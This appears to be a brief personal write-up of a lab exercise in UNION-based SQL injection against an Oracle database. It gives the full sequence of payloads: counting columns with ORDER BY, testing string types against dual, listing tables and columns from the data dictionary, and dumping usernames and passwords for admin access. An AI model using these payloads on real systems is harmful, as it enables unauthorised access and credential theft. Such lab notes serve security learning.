# listing on Oracle database

list query

``` sql
select * from all_tables
```

listing via column query

``` sql
select * from all_tab_column where table_name='Users'
```

end goal : listing content of database

need to find columns

```sql
' order by 1--
' order by 2--
```

two columns

String data type query

```sql
' union select 'a', 'a' from dual--
```

both column contains string

finding tables name

```sql
' union select table_name, NULL from all_tables-- 
```

got the tables

now retireving more the data of column

```sql
' union select column_name, NULL from all_tab_columns where table_name='USERS_ERVCVG
'-- 
```

got the column of user and password

``` sql
' union select USERNAME_HZHOFM
, PASSWORD_MHVDJN from USERS_ERVCVG-- 
```

got the password for admin access
